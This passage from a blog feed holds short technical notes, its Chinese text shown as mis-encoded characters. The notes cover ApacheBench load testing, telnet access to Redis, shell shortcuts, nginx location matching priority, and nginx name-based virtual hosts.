href="http://wiki.jikexueyuan.com/project/neural-networks-and-deep-learning-zh-cn/">ç¥ç»ç½‘ç»œä¸æ·±åº¦å­¦ä¹ </a></p><p><a href="https://www.gitbook.com/book/hit-scir/neural-networks-and-deep-learning-zh_cn/details">ç¥ç»ç½‘ç»œä¸æ·±åº¦å­¦ä¹ </a></p><p><a href="https://ask.julyedu.com/question/7407">MAC chainer-fast-neuralstyle å®æ—¶é£æ ¼è½¬æ¢</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python generate.py ./ritan.jpg -m ./models/starry.model -o ritan-starry.jpg</span><br></pre></td></tr></table></figure><p><a href="https://ask.julyedu.com/question/7403">æ¢µé«˜ä½œç”» MAC + tensorflow + CPU ç‰ˆæœ¬</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neural_style.py --content ./ritan.jpg --styles ./examples/1-style.jpg --output ./ritan-style.jpg --iterations 500</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ab</title>
      <link href="/post/ab.html"/>
      <url>/post/ab.html</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd-tools</span><br><span class="line">or</span><br><span class="line">yum install apr-util</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><blockquote><p>å¹¶å‘æ•°å¤ªå¤§ä¼šæœ‰<code>Too many open files</code>é”™è¯¯ã€‚æˆ‘ä»¬éœ€è¦<code>ulimit -n 1024</code>è®¾ç½®æ‰“å¼€æœ€å¤§æ–‡ä»¶å¥æŸ„æ•°å³å¯ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">ab -n 10000 -c 200 http://10.0.1.4/redis <span class="comment"># -n åé¢çš„10000ä»£è¡¨æ€»å…±å‘å‡º10000ä¸ªè¯·æ±‚ï¼›-cåé¢çš„200è¡¨ç¤ºé‡‡ç”¨200ä¸ªå¹¶å‘ï¼ˆæ¨¡æ‹Ÿ200ä¸ªäººåŒæ—¶è®¿é—®ï¼‰ï¼Œåé¢çš„ç½‘å€è¡¨ç¤ºæµ‹è¯•çš„ç›®æ ‡URLã€‚</span></span></span><br><span class="line">This is ApacheBench, Version 2.3 &lt;$Revision: 1748469 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking 10.0.1.4 (be patient)</span><br><span class="line">Completed 1000 requests</span><br><span class="line">Completed 2000 requests</span><br><span class="line">Completed 3000 requests</span><br><span class="line">Completed 4000 requests</span><br><span class="line">Completed 5000 requests</span><br><span class="line">Completed 6000 requests</span><br><span class="line">Completed 7000 requests</span><br><span class="line">Completed 8000 requests</span><br><span class="line">Completed 9000 requests</span><br><span class="line">Completed 10000 requests</span><br><span class="line">Finished 10000 requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        nginx/1.11.3</span><br><span class="line">Server Hostname:        10.0.1.4</span><br><span class="line">Server Port:            80</span><br><span class="line"></span><br><span class="line">Document Path:          /redis # æµ‹è¯•çš„é¡µé¢</span><br><span class="line">Document Length:        28 bytes # é¡µé¢å¤§å°</span><br><span class="line"></span><br><span class="line">Concurrency Level:      200 # å¹¶å‘è¯·æ±‚æ•°</span><br><span class="line">Time taken for tests:   4.512 seconds # æ•´ä¸ªæµ‹è¯•æŒç»­çš„æ—¶é—´</span><br><span class="line">Complete requests:      10000 # å®Œæˆçš„è¯·æ±‚æ•°</span><br><span class="line">Failed requests:        170 # å¤±è´¥çš„è¯·æ±‚æ•°</span><br><span class="line">   (Connect: 0, Receive: 0, Length: 170, Exceptions: 0)</span><br><span class="line">Total transferred:      1700170 bytes # æ•´ä¸ªåœºæ™¯ä¸­çš„ç½‘ç»œä¼ è¾“é‡</span><br><span class="line">HTML transferred:       280170 bytes # æ•´ä¸ªåœºæ™¯ä¸­çš„HTMLå†…å®¹ä¼ è¾“é‡</span><br><span class="line">Requests per second:    2216.07 [#/sec] (mean) # ååç‡ï¼Œå¤§å®¶æœ€å…³å¿ƒçš„æŒ‡æ ‡ä¹‹ä¸€ï¼Œç›¸å½“äº LR ä¸­çš„æ¯ç§’äº‹åŠ¡æ•°ï¼Œåé¢æ‹¬å·ä¸­çš„ mean è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¹³å‡å€¼</span><br><span class="line">Time per request:       90.250 [ms] (mean) # ç”¨æˆ·å¹³å‡è¯·æ±‚ç­‰å¾…æ—¶é—´ï¼Œå¤§å®¶æœ€å…³å¿ƒçš„æŒ‡æ ‡ä¹‹äºŒï¼Œç›¸å½“äº LR ä¸­çš„å¹³å‡äº‹åŠ¡å“åº”æ—¶é—´ï¼Œåé¢æ‹¬å·ä¸­çš„ mean è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¹³å‡å€¼</span><br><span class="line">Time per request:       0.451 [ms] (mean, across all concurrent requests) # æœåŠ¡å™¨å¹³å‡è¯·æ±‚å¤„ç†æ—¶é—´ï¼Œå¤§å®¶æœ€å…³å¿ƒçš„æŒ‡æ ‡ä¹‹ä¸‰</span><br><span class="line">Transfer rate:          367.94 [Kbytes/sec] received # å¹³å‡æ¯ç§’ç½‘ç»œä¸Šçš„æµé‡ï¼Œå¯ä»¥å¸®åŠ©æ’é™¤æ˜¯å¦å­˜åœ¨ç½‘ç»œæµé‡è¿‡å¤§å¯¼è‡´å“åº”æ—¶é—´å»¶é•¿çš„é—®é¢˜</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿™æ®µè¡¨ç¤ºç½‘ç»œä¸Šæ¶ˆè€—çš„æ—¶é—´çš„åˆ†è§£</span></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:        2   23   7.9     24     157</span><br><span class="line">Processing:    14   66  22.4     70     243</span><br><span class="line">Waiting:       14   66  22.4     70     243</span><br><span class="line">Total:         20   89  23.4     95     255</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿™æ®µæ˜¯æ¯ä¸ªè¯·æ±‚å¤„ç†æ—¶é—´çš„åˆ†å¸ƒæƒ…å†µï¼Œ50%çš„å¤„ç†æ—¶é—´åœ¨95mså†…ï¼Œ66%çš„å¤„ç†æ—¶é—´åœ¨98mså†…...ï¼Œé‡è¦çš„æ˜¯çœ‹90%çš„å¤„ç†æ—¶é—´ã€‚</span></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line"><span class="meta prompt_">  50% </span><span class="language-bash">    95</span></span><br><span class="line"><span class="meta prompt_">  66% </span><span class="language-bash">    98</span></span><br><span class="line"><span class="meta prompt_">  75% </span><span class="language-bash">    99</span></span><br><span class="line"><span class="meta prompt_">  80% </span><span class="language-bash">   100</span></span><br><span class="line"><span class="meta prompt_">  90% </span><span class="language-bash">   102</span></span><br><span class="line"><span class="meta prompt_">  95% </span><span class="language-bash">   106</span></span><br><span class="line"><span class="meta prompt_">  98% </span><span class="language-bash">   110</span></span><br><span class="line"><span class="meta prompt_">  99% </span><span class="language-bash">   224</span></span><br><span class="line"><span class="meta prompt_"> 100% </span><span class="language-bash">   255 (longest request)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.jianshu.com/p/43d04d8baaf7">è¶…å®ç”¨å‹åŠ›æµ‹è¯•å·¥å…·ï¼abå·¥å…·</a></li><li><a href="http://www.ha97.com/4617.html">Webæ€§èƒ½å‹åŠ›æµ‹è¯•å·¥å…·ä¹‹ApacheBenchï¼ˆabï¼‰è¯¦è§£</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>telnet</title>
      <link href="/post/telnet.html"/>
      <url>/post/telnet.html</url>
      
        <content type="html"><![CDATA[<h3 id="telnet-è¿æ¥-redis"><a href="#telnet-è¿æ¥-redis" class="headerlink" title="telnet è¿æ¥ redis"></a>telnet è¿æ¥ redis</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">telnet 10.0.1.3 6379</span></span><br><span class="line">Trying 10.0.1.3...</span><br><span class="line">Connected to 10.0.1.3.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">set name tyk</span><br><span class="line">+OK</span><br><span class="line">get name</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">tyk</span><br><span class="line">set age 10</span><br><span class="line">+OK</span><br><span class="line">get age</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2</span></span><br><span class="line">10</span><br><span class="line">quit</span><br><span class="line">+OK</span><br><span class="line">Connection closed by foreign host.</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><h3 id="é€€å‡º-telnet"><a href="#é€€å‡º-telnet" class="headerlink" title="é€€å‡º telnet"></a>é€€å‡º telnet</h3><p><code>ctrl + ]</code> ç„¶å <code>quit</code></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.cnblogs.com/peida/archive/2013/03/13/2956992.html">ã€1ã€‘</a> <a href="http://www.cnblogs.com/kuailewangzi1212/archive/2006/11/29/576986.html">ã€2ã€‘</a> <a href="http://wangyifeng.blog.51cto.com/2144905/398950">ã€3ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>command</title>
      <link href="/post/command.html"/>
      <url>/post/command.html</url>
      
        <content type="html"><![CDATA[<ul><li><code>cd -</code> è¿”å›å‰ä¸€ä¸ªç›®å½•(<code>cd $OLDPWD</code>)</li><li><code>open .</code> æ‰“å¼€å½“å‰ç›®å½•</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx-location</title>
      <link href="/post/nginx-location.html"/>
      <url>/post/nginx-location.html</url>
      
        <content type="html"><![CDATA[<h3 id="location-è¡¨è¾¾å¼ç±»å‹"><a href="#location-è¡¨è¾¾å¼ç±»å‹" class="headerlink" title="location è¡¨è¾¾å¼ç±»å‹"></a>location è¡¨è¾¾å¼ç±»å‹</h3><table><thead><tr><th>syntax</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&#x3D;</td><td>è¿›è¡Œæ™®é€šå­—ç¬¦ç²¾ç¡®åŒ¹é…ã€‚ä¹Ÿå°±æ˜¯å®Œå…¨åŒ¹é…ã€‚</td></tr><tr><td>^~</td><td>è¡¨ç¤ºæ™®é€šå­—ç¬¦åŒ¹é…ï¼ˆè¡¨ç¤º uri ä»¥æŸä¸ªå¸¸è§„å­—ç¬¦ä¸²å¼€å¤´ï¼‰ã€‚ä½¿ç”¨å‰ç¼€åŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸåˆ™ä¸å†åŒ¹é…å…¶ä»– locationã€‚</td></tr><tr><td>~</td><td>è¡¨ç¤ºæ‰§è¡Œä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼ŒåŒºåˆ†å¤§å°å†™</td></tr><tr><td>~*</td><td>è¡¨ç¤ºæ‰§è¡Œä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œä¸åŒºåˆ†å¤§å°å†™</td></tr><tr><td></td><td>æ— ä»»ä½•å‰ç¼€çš„éƒ½å±äºæ™®é€šlocation</td></tr><tr><td>@</td><td>â€œ@â€ å®šä¹‰ä¸€ä¸ªå‘½åçš„ locationï¼Œä½¿ç”¨åœ¨å†…éƒ¨å®šå‘æ—¶ï¼Œä¾‹å¦‚ error_page, try_files</td></tr></tbody></table><h3 id="location-ä¼˜å…ˆçº§è¯´æ˜"><a href="#location-ä¼˜å…ˆçº§è¯´æ˜" class="headerlink" title="location ä¼˜å…ˆçº§è¯´æ˜"></a>location ä¼˜å…ˆçº§è¯´æ˜</h3><p>åœ¨nginxçš„locationå’Œé…ç½®ä¸­locationçš„é¡ºåºæ²¡æœ‰å¤ªå¤§å…³ç³»ã€‚æ­£locationè¡¨è¾¾å¼çš„ç±»å‹æœ‰å…³ã€‚ç›¸åŒç±»å‹çš„è¡¨è¾¾å¼ï¼Œå­—ç¬¦ä¸²é•¿çš„ä¼šä¼˜å…ˆåŒ¹é…ã€‚<br>ä»¥ä¸‹æ˜¯æŒ‰ä¼˜å…ˆçº§æ’åˆ—è¯´æ˜ï¼š<br>ç¬¬ä¸€ä¼˜å…ˆçº§ï¼šç­‰å·ç±»å‹ï¼ˆ&#x3D;ï¼‰çš„ä¼˜å…ˆçº§æœ€é«˜ã€‚ä¸€æ—¦åŒ¹é…æˆåŠŸï¼Œåˆ™ä¸å†æŸ¥æ‰¾å…¶ä»–åŒ¹é…é¡¹ã€‚<br>ç¬¬äºŒä¼˜å…ˆçº§ï¼š^~ç±»å‹è¡¨è¾¾å¼ã€‚ä¸€æ—¦åŒ¹é…æˆåŠŸï¼Œåˆ™ä¸å†æŸ¥æ‰¾å…¶ä»–åŒ¹é…é¡¹ã€‚<br>ç¬¬ä¸‰ä¼˜å…ˆçº§ï¼šæ­£åˆ™è¡¨è¾¾å¼ç±»å‹ï¼ˆ~ ~* ï¼‰çš„ä¼˜å…ˆçº§æ¬¡ä¹‹ã€‚å¦‚æœæœ‰å¤šä¸ªlocationçš„æ­£åˆ™èƒ½åŒ¹é…çš„è¯ï¼Œåˆ™ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœ€é•¿çš„é‚£ä¸ªã€‚<br>ç¬¬å››ä¼˜å…ˆçº§ï¼šå¸¸è§„å­—ç¬¦ä¸²åŒ¹é…ç±»å‹ã€‚æŒ‰å‰ç¼€åŒ¹é…ã€‚</p><blockquote><p>æ™®é€šåŒ¹é…ï¼Œéµå¾ªæœ€é•¿åŒ¹é…è§„åˆ™ï¼Œå‡è®¾ä¸€ä¸ªè¯·æ±‚åŒ¹é…åˆ°äº†ä¸¤ä¸ªæ™®é€šè§„åˆ™ï¼Œåˆ™é€‰æ‹©åŒ¹é…é•¿åº¦å¤§çš„é‚£ä¸ª</p></blockquote><h3 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># RULE_1 ç²¾ç¡®åŒ¹é…</span><br><span class="line">location = / &#123;</span><br><span class="line">    echo &quot;600&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_2 ç²¾ç¡®åŒ¹é…</span><br><span class="line">location = /images/favicon.ico &#123;</span><br><span class="line">    echo &quot;601&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_4 æ— å‰ç¼€åŒ¹é… ä¸èƒ½å’Œ`^~ /images/`ä¸€èµ·é…ç½®ï¼Œå†²çªã€‚</span><br><span class="line"># location /images/ &#123;</span><br><span class="line">#   echo &quot;602;    &quot; </span><br><span class="line"># &#125;</span><br><span class="line"></span><br><span class="line"># RULE_5 æ™®é€šå­—ç¬¦åŒ¹é… å­—ç¬¦åŒ¹é…ä¼˜å…ˆçº§å¤§äºæ­£åˆ™</span><br><span class="line">location ^~ /images/ &#123;</span><br><span class="line">    echo &quot;602&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_6 æ™®é€šå­—ç¬¦åŒ¹é…</span><br><span class="line">location ^~ /images/fruit/ &#123;</span><br><span class="line">    echo &quot;603&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_7 æ­£åˆ™åŒ¹é…</span><br><span class="line">location ~ ^/images/ &#123;</span><br><span class="line">    echo &quot;604&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_8 æ­£åˆ™åŒ¹é…</span><br><span class="line">location ~ \.(jpg|png|ico)$ &#123;</span><br><span class="line">    echo &quot;605&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_9 æ­£åˆ™åŒ¹é…</span><br><span class="line">location ~ /^documents/ &#123;   </span><br><span class="line">    echo &quot;606&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_10 æ­£åˆ™åŒ¹é… **æ­£åˆ™åŒ¹é…æ—¶å’Œé¡ºåºæœ‰å…³**</span><br><span class="line">location ~ \.(docx|pptx|pdf)$ &#123;</span><br><span class="line">    echo &quot;607&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_11 æ— å‰ç¼€</span><br><span class="line">location /files/ &#123;</span><br><span class="line">    echo &quot;608&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># RULE_12 æ— å‰ç¼€</span><br><span class="line">location /files/videos/ &#123;</span><br><span class="line">    echo &quot;609&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># æ— å‰ç¼€ RULE_13</span><br><span class="line">location / &#123;</span><br><span class="line">    echo &quot;699&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/</code> &#x3D;&gt; 600;<br><code>/images/favicon.ico</code> &#x3D;&gt; 601;<br><code>/images/head.jpg</code> &#x3D;&gt; 602;<br><code>/images/person/ming.jpg</code> &#x3D;&gt; 602;<br><code>/images/fruit/watermelon.jpg</code> &#x3D;&gt; 603;<br><code>/head.png</code> &#x3D;&gt; 605;<br><code>/documents/project.docx</code> &#x3D;&gt; 606;<br><code>files/The-Lord-of-the-Rings.mp4</code> &#x3D;&gt; 608;<br><code>files/videos/The-Lord-of-the-Rings.mp4</code> &#x3D;&gt; 609;<br><code>/fruit.html</code> &#x3D;&gt; 699;    </p><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><ol><li>ç²¾ç¡®åŒ¹é…<code>=</code>ä¼˜å…ˆçº§æœ€å¤§ã€‚</li><li>æ™®é€šå­—ç¬¦åŒ¹é…<code>^~</code>æ¯”æ­£åˆ™ä¼˜å…ˆçº§å¤§<code>~</code>ï¼Œå¤šä¸ªæ™®é€šå­—ç¬¦ä¸²è§„åˆ™éƒ½åŒ¹é…æ—¶ï¼ŒåŒ¹é…æœ€é•¿çš„ä¼˜å…ˆçº§æœ€é«˜ã€‚</li><li>æ­£åˆ™åŒ¹é…æ—¶ï¼Œå¦‚æœå¤šæ¡è§„åˆ™éƒ½ç¬¦åˆæ’åœ¨å‰é¢çš„çš„ä¼˜å…ˆçº§æœ€å¤§ã€‚</li><li>æ— å‰ç¼€æœ€ååŒ¹é…ä¼˜å…ˆçº§æœ€ä½ï¼Œå¤šä¸ªéƒ½åŒ¹é…æ—¶ï¼ŒåŒ¹é…æœ€é•¿çš„ä¼˜å…ˆçº§æœ€é«˜ã€‚</li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.bo56.com/nginx-location%E5%9C%A8%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7/">nginx locationåœ¨é…ç½®ä¸­çš„ä¼˜å…ˆçº§</a> </li><li><a href="https://gist.github.com/luxixing/7262911">ginx-location</a></li><li><a href="http://eyesmore.iteye.com/blog/1141660">Nginx å…³äº location çš„åŒ¹é…è§„åˆ™è¯¦è§£</a></li><li><a href="http://denglz.blog.51cto.com/3617037/1341841">NGINX çš„ location è¯­æ³•è§„åˆ™</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginxé™æµ</title>
      <link href="/post/nginx-http-limit.html"/>
      <url>/post/nginx-http-limit.html</url>
      
        <content type="html"><![CDATA[<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.bo56.com/%E4%BD%BF%E7%94%A8%E9%99%90%E6%B5%81%E7%AD%96%E7%95%A5%EF%BC%8C%E8%AE%A9%E7%B3%BB%E7%BB%9F%E6%9B%B4%E7%A8%B3%E5%AE%9A/">ã€1ã€‘</a> <a href="http://jinnianshilongnian.iteye.com/blog/2305117">ã€2ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginxè™šæ‹Ÿä¸»æœº</title>
      <link href="/post/nginx-virtual-host.html"/>
      <url>/post/nginx-virtual-host.html</url>
      
        <content type="html"><![CDATA[<h3 id="åŸºäºåå­—çš„è™šæ‹Ÿä¸»æœº"><a href="#åŸºäºåå­—çš„è™šæ‹Ÿä¸»æœº" class="headerlink" title="åŸºäºåå­—çš„è™šæ‹Ÿä¸»æœº"></a>åŸºäºåå­—çš„è™šæ‹Ÿä¸»æœº</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name example.org www.example.org;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name example.com www.example.com;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªé…ç½®ä¸­ï¼Œ<code>Nginx</code>ä»…ä»…æ£€æŸ¥è¯·æ±‚çš„<code>Host</code>å¤´ä»¥å†³å®šè¯¥è¯·æ±‚åº”ç”±å“ªä¸ªè™šæ‹Ÿä¸»æœºæ¥å¤„ç†ã€‚å¦‚æœ<code>Host</code>å¤´æ²¡æœ‰åŒ¹é…ä»»æ„ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œæˆ–è€…è¯·æ±‚ä¸­æ ¹æœ¬æ²¡æœ‰åŒ…å«<code>Host</code>å¤´ï¼Œé‚£<code>Nginx</code>ä¼šå°†è¯·æ±‚åˆ†å‘åˆ°å®šä¹‰åœ¨æ­¤ç«¯å£ä¸Šçš„é»˜è®¤è™šæ‹Ÿä¸»æœºã€‚åœ¨ä»¥ä¸Šé…ç½®ä¸­ï¼Œ<strong>ç¬¬ä¸€ä¸ª</strong> è¢«åˆ—å‡ºçš„è™šæ‹Ÿä¸»æœºå³<code>Nginx</code>çš„é»˜è®¤è™šæ‹Ÿä¸»æœºâ€”â€”è¿™æ˜¯<code>Nginx</code>çš„é»˜è®¤è¡Œä¸ºã€‚è€Œä¸”ï¼Œå¯ä»¥æ˜¾å¼åœ°è®¾ç½®æŸä¸ªä¸»æœºä¸ºé»˜è®¤è™šæ‹Ÿä¸»æœºï¼Œå³åœ¨<code>listen</code>æŒ‡ä»¤ä¸­è®¾ç½®<code>default_server</code>å‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      80 default_server;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>default_server</code> å‚æ•°ä»0.8.21ç‰ˆå¼€å§‹å¯ç”¨ã€‚åœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œåº”è¯¥ä½¿ç”¨â€defaultâ€å‚æ•°ä»£æ›¿ã€‚<br><code>.example.com</code> ä¼šåŒ¹é…<code>example.com</code>å’Œ<code>www.example.com</code>ã€‚</p></blockquote><blockquote><p>Nginxæ˜¯æ ¹æ®<code>Host</code>æ¥æŸ¥æ‰¾è™šæ‹Ÿä¸»æœºçš„ã€‚ä¸‹é¢ä¾‹å­æˆ‘ä»¬ä½¿ç”¨IPå‘èµ·çš„è¯·æ±‚ï¼Œä½†æ˜¯åœ¨è¯·æ±‚å¤´ä¸­<code>Host</code>åŠ ä¸Šäº†åŸŸå<code>Nginx</code>å°±ä¼šå»æŸ¥æ‰¾<code>www.example.com</code>è¿™ä¸ªä¸»æœºã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --header &quot;Host: www.example.com&quot; http://127.0.0.1/</span><br></pre></td></tr></table></figure><h3 id="å¦‚ä½•é˜²æ­¢å¤„ç†æœªå®šä¹‰ä¸»æœºåçš„è¯·æ±‚"><a href="#å¦‚ä½•é˜²æ­¢å¤„ç†æœªå®šä¹‰ä¸»æœºåçš„è¯·æ±‚" class="headerlink" title="å¦‚ä½•é˜²æ­¢å¤„ç†æœªå®šä¹‰ä¸»æœºåçš„è¯·æ±‚"></a>å¦‚ä½•é˜²æ­¢å¤„ç†æœªå®šä¹‰ä¸»æœºåçš„è¯·æ±‚</h3><p>å¦‚æœä¸å…è®¸è¯·æ±‚ä¸­ç¼ºå°‘<code>Host</code>å¤´ï¼Œå¯ä»¥å®šä¹‰å¦‚ä¸‹ä¸»æœºï¼Œä¸¢å¼ƒè¿™äº›è¯·æ±‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 